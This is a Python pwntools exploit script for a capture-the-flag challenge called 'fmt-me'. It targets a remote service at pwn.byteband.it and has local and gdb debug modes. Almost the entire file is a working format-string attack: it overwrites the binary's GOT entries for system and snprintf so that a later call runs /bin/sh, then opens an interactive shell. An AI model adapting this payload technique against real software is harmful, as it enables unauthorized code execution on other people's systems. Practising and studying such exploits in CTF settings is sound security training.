#!/usr/bin/env python
"""Exploit script for fmt-me."""
import sys
import subprocess
from pwn import *

context.log_level = 'info'

BINARY = "./fmt"
LIB = ""
HOST = 'pwn.byteband.it'
PORT = 6969

GDB_COMMANDS = ['b *0x00000000004012D5', 'c']


def send_fmt_string(p, choice, fmt_string):
    """Some helper function."""
    p.sendlineafter("Choice:", choice)
    p.sendlineafter("Good job. I'll give you a gift.", fmt_string)

def exploit(p, mode):
    """Exploit."""

    choice = b"2"
    fmt_string = b"A"*0xC0 + b"%31$hhnA" + p64(context.binary.got["system"])

    log.info("Overwriting system in .got with main")
    send_fmt_string(p, choice, fmt_string)

    choice = b"2"
    value = 0x401056
    addr = context.binary.got["snprintf"]

    fmt = f"/bin/sh;%4$0{value-8}d" + "%10$ln"
    fmt = str.encode(fmt).ljust(0x20, b"A")
    assert(len(fmt) == 0x20)
    fmt_string = fmt + p64(addr)

    log.info("Sending format string")
    send_fmt_string(p, choice, fmt_string)

    send_fmt_string(p, "2", "boom")
    p.recv()

    p.interactive()

def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <mode>")
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        log.warn(f"Failed to load binary ({BINARY})")

    mode = sys.argv[1]

    if mode == "local":
        p = remote("pwn.local", 2222)

    elif mode == "debug":
        p = remote("pwn.local", 2223)
        gdb_cmd = ['tmux',
                   'split-window',
                   '-p',
                   '75',
                   'gdb',
                   '-ex',
                   'target remote pwn.local:2224',
                   ]

        for cmd in GDB_COMMANDS:
            gdb_cmd.append("-ex")
            gdb_cmd.append(cmd)

        gdb_cmd.append(BINARY)

        subprocess.Popen(gdb_cmd)

    elif mode == "remote":
        p = remote(HOST, PORT)

    else:
        print("Invalid mode")
        sys.exit(1)

    exploit(p, mode)

if __name__ == "__main__":

    main()
